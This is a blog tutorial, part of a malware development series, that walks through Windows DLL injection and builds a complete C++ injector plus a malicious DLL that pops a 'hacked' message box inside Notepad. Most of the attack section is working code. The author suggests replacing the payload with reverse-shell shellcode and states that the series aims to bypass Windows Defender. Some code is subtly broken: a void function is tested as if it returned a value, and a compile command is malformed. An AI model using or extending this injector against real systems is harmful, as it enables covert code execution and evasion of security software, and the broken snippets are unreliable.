---
title: 'Malwares Development Series | Part 2 : Process Injection | DLL Injection'
published: 2024-07-20
description: ''
image: ''
tags: ['Malwares', 'CTF', 'Forensics', 'DFIR', 'RedTeam', 'BlueTeam', 'APT', 'Threat Hunting']
category: 'Malwares'
draft: false 
---

Hello guys, Lets begin with the first malware technique which isss DLL Injection. If you didn't check the plan of our walkthrough go to it : [Introduction](https://snakeeyes1.netlify.app/posts/my-first-post/)

So if it's the first time that you encounter the term DLL, here is a small definition. 

## what is a DLL ?

A DLL or Dynamic Link Libraries is a modules that contain functions and data that can be used by another module (process or DLL).

You didn't understand huh, I'll give you an example, Imagine a process like notepad.

Notepad, as a simple text editor, relies on several standard Windows DLLs. Here are some of the common ones you might see:

```kernel32.dll```: It's an important one that we will encounter many times, It provides core operating system functionalities, such as memory management, input/output operations, and process and thread creation.

```user32.dll```: It contains functions for handling user interface components like windows, menus, and user input.

```gdi32.dll```: This one handles graphics device interface (GDI) functions for drawing graphics and text.

There is a lot of DLLs that Notepad uses.     

Note that multiple applications can share the same DLL in memory, reducing the overall memory footprint. This is especially beneficial for common libraries like the Windows API.

## What is DLL Injection ?

Here is a simple definition:

DLL injection is a technique used to execute code within the address space of another process by forcing it to load a dynamic link library (DLL).

## How DLL Injection Works ?

DLL injection typically involves 4 important steps:

- **Attaching to the Target Process**

The injector program attaches to the target process. This can be done using functions like OpenProcess, which opens a handle to the target process.

- **Allocating Memory in the Target Process**

The injector allocates memory within the target process’s address space to store the path of the DLL to be injected. This is often done using the VirtualAllocEx function.

- **Writing the DLL Path into the Allocated Memory**

The path of the DLL to be injected is written into the allocated memory in the target process using the WriteProcessMemory function.

- **Loading the DLL into the Target Process** 

The injector creates a remote thread in the target process that executes the LoadLibrary function, which loads the DLL into the process. This can be done using the CreateRemoteThread function or other similar functions like NtCreateThreadEx.

Let's break these steps to c++ code with clarifying the Windows APIs that we'll use.

### DLL Creation 

So starting by create our malicious DLL that contain a function, this function raise a message box that says " you've been hacked by Sn4ke Ey3s ".

```cpp
// InjectedDLL.cpp
#include <windows.h>

extern "C" __declspec(dllexport) void InjectedFunction() {
    MessageBoxA(NULL, "You’ve been hacked by Sn4ke Ey3s", "Success", MB_OK);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        InjectedFunction();
    }
    return TRUE;
}
```

It's time to take some notes, The DllMain function is the entry point for a DLL (Dynamic-Link Library) in Windows. It is called by the operating system when the DLL is loaded or unloaded, or when certain events occur.

So the logic of DLL injection begins to appear clearly, when we will inject our DLL into the legitimate process ( ex:notepad ), our DLL will automatically load the DLLmain to execute what's inside it (malicious things).

After we create our DLL structure, now we should compile the DLL code to DLL file.
We can do this by executing this code

```powershell
cl /LD InjectedDLL.cpp /link /out:InjectedDLL.dll
```
or ( recommended )

```powershell
g++ - shared InjectedDLL.dll InjectedDLL.cpp
```

### Target process attaching 

Moving know to attaching the target process and the way to do that is to open a handle to it.

Note that a handle is an abstract reference used by the Windows operating system to access and manage processes. It acts as an identifier that allows a program to perform various operations on a process, such as reading or writing memory, modifying process attributes, and interacting with its threads.

So the way to do that is by using the windows API function OpenProcess() in our Injector.cpp code

```cpp
// Injector.cpp
#include <windows.h>
#include <iostream>

void InjectDLL(DWORD processID, const char* dllPath) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
    if (!hProcess) {
        std::cerr << "OpenProcess failed!" << std::endl;
        return;
    }
}
```

As we see the OpenProcess() API function take several args, here are all of them :
 
```cpp 
HANDLE OpenProcess(
  DWORD dwDesiredAccess,  // The access rights requested for the process
  BOOL bInheritHandle,    // Indicates whether the handle is inheritable
  DWORD dwProcessId       // The identifier of the process to be opened
);
```

| Argument         | Type   | Description                                                                                           |
|------------------|--------|-------------------------------------------------------------------------------------------------------|
| dwDesiredAccess  | DWORD  | Specifies the access rights requested for the process. This parameter can be a combination of one or more of the following access rights: |
|                  |        | - **PROCESS_ALL_ACCESS**: All possible access rights for a process object.                             |
|                  |        | - **PROCESS_CREATE_PROCESS**: Required to create a process.                                            |
|                  |        | - **PROCESS_CREATE_THREAD**: Required to create a thread.                                              |
|                  |        | - **PROCESS_DUP_HANDLE**: Required to duplicate a handle.                                              |
|                  |        | - **PROCESS_QUERY_INFORMATION**: Required to retrieve certain information about a process, such as its token, exit code, and priority class. |
|                  |        | - **PROCESS_QUERY_LIMITED_INFORMATION**: Required to retrieve certain information about a process (available from Windows Vista). |
|                  |        | - **PROCESS_SET_INFORMATION**: Required to set certain information about a process, such as its priority class. |
|                  |        | - **PROCESS_SET_QUOTA**: Required to set memory limits.                                                |
|                  |        | - **PROCESS_SUSPEND_RESUME**: Required to suspend or resume a process.                                 |
|                  |        | - **PROCESS_TERMINATE**: Required to terminate a process.                                              |
|                  |        | - **PROCESS_VM_OPERATION**: Required to perform an operation on the address space of a process (e.g., VirtualAllocEx and VirtualFreeEx). |
|                  |        | - **PROCESS_VM_READ**: Required to read memory in a process using ReadProcessMemory.                   |
|                  |        | - **PROCESS_VM_WRITE**: Required to write to memory in a process using WriteProcessMemory.             |
| bInheritHandle   | BOOL   | Specifies whether the returned handle is inheritable by child processes. If this parameter is **TRUE**, the handle is inheritable. If **FALSE**, the handle is not inheritable. |
| dwProcessId      | DWORD  | Specifies the identifier of the process to be opened. This is the process ID (PID) of the target process. |


In our implementation we'll focus on the 1st and 3rd parameters which are the desiredAccec and the PID of the target process.

### Memory Allocation

The third step consists of Allocating some memory in the target process in order to take the path of our malicious DLL. We can achieve that by the API function VirtualAlloc().

Updating our Injector code :

```cpp
// Injector.cpp
#include <windows.h>
#include <iostream>

void InjectDLL(DWORD processID, const char* dllPath) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
    if (!hProcess) {
        std::cerr << "OpenProcess failed!" << std::endl;
        return;
    }

    // Allocate memory in the target process
    LPVOID pRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
    if (!pRemoteMemory) {
        std::cerr << "VirtualAllocEx failed!" << std::endl;
        CloseHandle(hProcess);
        return;
    }
}
```

The syntax of the API function :

```cpp
LPVOID VirtualAlloc(
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect
);
```

Every argument is described as follows :

| Argument           | Type      | Description                                                                                                           |
|--------------------|-----------|-----------------------------------------------------------------------------------------------------------------------|
| lpAddress          | LPVOID    | The starting address of the region to allocate. If NULL, the system determines where to allocate the region.          |
| dwSize             | SIZE_T    | The size of the region, in bytes.                                                                                     |
| flAllocationType   | DWORD     | The type of memory allocation. This parameter can contain one or more of the following values:                        |
|                    |           | - **MEM_COMMIT**: Allocates memory charges for the specified region of pages.                                         |
|                    |           | - **MEM_RESERVE**: Reserves a range of the process's virtual address space.                                           |
|                    |           | - **MEM_RESET**: Indicates data in the specified memory range is no longer needed.                                    |
|                    |           | - **MEM_RESET_UNDO**: Reverses the effects of MEM_RESET.                                                              |
|                    |           | - **MEM_LARGE_PAGES**: Allocates memory using large page support.                                                     |
|                    |           | - **MEM_PHYSICAL**: Allocates physical memory that is only accessible to the caller.                                  |
|                    |           | - **MEM_TOP_DOWN**: Allocates memory at the highest possible address.                                                 |
|                    |           | - **MEM_WRITE_WATCH**: Causes the system to track pages that are written to.                                          |
| flProtect          | DWORD     | The memory protection for the region of pages to be allocated. This parameter can be one of the following values:     |
|                    |           | - **PAGE_EXECUTE**: Enables execute access to the committed region of pages.                                          |
|                    |           | - **PAGE_EXECUTE_READ**: Enables execute or read-only access to the committed region of pages.                        |
|                    |           | - **PAGE_EXECUTE_READWRITE**: Enables execute, read-only, or read/write access to the committed region of pages.      |
|                    |           | - **PAGE_EXECUTE_WRITECOPY**: Enables execute, read-only, or copy-on-write access to a committed region of pages.     |
|                    |           | - **PAGE_NOACCESS**: Disables all access to the committed region of pages.                                            |
|                    |           | - **PAGE_READONLY**: Enables read-only access to the committed region of pages.                                       |
|                    |           | - **PAGE_READWRITE**: Enables read-only or read/write access to the committed region of pages.                        |
|                    |           | - **PAGE_WRITECOPY**: Enables read-only or copy-on-write access to a committed region of pages.                       |
|                    |           | - **PAGE_TARGETS_INVALID**: Marks the pages as targets for illegal cross-process calls.                               |
|                    |           | - **PAGE_TARGETS_NO_UPDATE**: Prevents pages from being marked as targets for illegal cross-process calls.            |

So as described, we specified the target process that we want to allocate memory from, and the size of the allocated memory which is the length of our DLL path.

### Writing DLL path to the allocated memory

Now, move on to write the path into the allocated memory.

```cpp
// Injector.cpp
#include <windows.h>
#include <iostream>

void InjectDLL(DWORD processID, const char* dllPath) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
    if (!hProcess) {
        std::cerr << "OpenProcess failed!" << std::endl;
        return;
    }

    // Allocate memory in the target process
    LPVOID pRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
    if (!pRemoteMemory) {
        std::cerr << "VirtualAllocEx failed!" << std::endl;
        CloseHandle(hProcess);
        return;
    }

    // Write the DLL path to the allocated memory
    if (!WriteProcessMemory(hProcess, pRemoteMemory, dllPath, strlen(dllPath) + 1, NULL)) {
        std::cerr << "WriteProcessMemory failed!" << std::endl;
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }
}
```

As we see, WriteProcessMemory() takes the handle to the target process, the allocated space, the path to write into the allocated space and the length of the path.

So without further complications, let's move on to the important step, which is loading our malicious DLL.

### DLL loading

So now have you wondered how we will load our DLL into the target process. we need a magical function that can do that, which is LoadLibraryA(). This one simply load a DLL.

But wait, we need to use it to load the DLL Into the target process and not to our injector code process.

So how to do that ?

The way to achieve this is by retrieve the LoadLibraryA function from it's DLL which is kernel32.dll then create a remote thread for the target process to execute this LoadLibraryA that will load our malicious DLL.

So how to access kernel32.dll
and load the function LoadLibraryA from it, we'll use GetModuleHandleA() to take a handle to kernel32.dll and then we'll use GetProcAdress() to retrieve the function LoadLibraryA() using its name.

Adding that to our injector code :

```cpp
// Injector.cpp
#include <windows.h>
#include <iostream>

void InjectDLL(DWORD processID, const char* dllPath) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
    if (!hProcess) {
        std::cerr << "OpenProcess failed!" << std::endl;
        return;
    }

    // Allocate memory in the target process
    LPVOID pRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
    if (!pRemoteMemory) {
        std::cerr << "VirtualAllocEx failed!" << std::endl;
        CloseHandle(hProcess);
        return;
    }

    // Write the DLL path to the allocated memory
    if (!WriteProcessMemory(hProcess, pRemoteMemory, dllPath, strlen(dllPath) + 1, NULL)) {
        std::cerr << "WriteProcessMemory failed!" << std::endl;
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }

    // Load the kernel32.dll
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    // Get the address of LoadLibraryA from kernel32.dll
    LPTHREAD_START_ROUTINE pLoadLibraryA = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryA");

    // Create a remote thread that calls LoadLibraryA
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryA, pRemoteMemory, 0, NULL);
    if (!hThread) {
        std::cerr << "CreateRemoteThread failed!" << std::endl;
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }
}
```

So the CreateRemoteThread() takes as arguments the handle to the process, The thread routine function which is LoadLibraryA and the arguments passed to it ( in our injector code it is the memory allocated which hold the DLL path ).

We need to wait for this thread to be fully executed in order to free the allocated space.

Updated code :
```cpp
// Injector.cpp
#include <windows.h>
#include <iostream>

void InjectDLL(DWORD processID, const char* dllPath) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
    if (!hProcess) {
        std::cerr << "OpenProcess failed!" << std::endl;
        return;
    }

    // Allocate memory in the target process
    LPVOID pRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
    if (!pRemoteMemory) {
        std::cerr << "VirtualAllocEx failed!" << std::endl;
        CloseHandle(hProcess);
        return;
    }

    // Write the DLL path to the allocated memory
    if (!WriteProcessMemory(hProcess, pRemoteMemory, dllPath, strlen(dllPath) + 1, NULL)) {
        std::cerr << "WriteProcessMemory failed!" << std::endl;
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }

    // Get the address of LoadLibraryA
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    LPTHREAD_START_ROUTINE pLoadLibraryA = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryA");

    // Create a remote thread that calls LoadLibraryA
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryA, pRemoteMemory, 0, NULL);
    if (!hThread) {
        std::cerr << "CreateRemoteThread failed!" << std::endl;
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }

    // Wait for the remote thread to complete
    WaitForSingleObject(hThread, INFINITE);

    // Clean up
    VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);
}

```

Now we can execute our Injector function in a main function to see this implementation. But first let's implement the Injected DLL cpp code, using the commande ```g++ - shared InjectedDLL.dll InjectedDLL.cpp``` to transform the code to a DLL. After doing that we should have the DLL, The only thing remains is choosing notepad as a target process, get the pid of it from Process Explorer which is a program that monitor processes.

![ProcessPID](/favicon/2.jpeg)

We can see that the PID is ```14348```
Now let's execute our injector code.

```Executing our Injector```
```cpp
// Injector.cpp

int main() {
    DWORD processID = 14348; // Replace with the target process ID
    const char* dllPath = "C:\\Users\\hp\\InjectedDLL.dll";

    if (InjectDLL(processID, dllPath)) {
        std::cout << "DLL injected successfully!" << std::endl;
    } else {
        std::cerr << "DLL injection failed!" << std::endl;
    }

    return 0;
}
```


![ProcessPID](/favicon/4.jpeg)

Boooooom, I hacked my self, You can customise the DLL to do something advanced like injecting a shell code to get a reverse shell, or something else. it depends on your needs. But remember, do it on your machine, not your friend's machine.
If you are facing some errors or issues, try to disable the Windows Defender, because defender know these types of attacks. and that what we are seeking In this series of blogs ( To bypass this freak ).

I hope you enjoyed this walkthrough. 

## See you next time Inchallah, to cover the next topic.
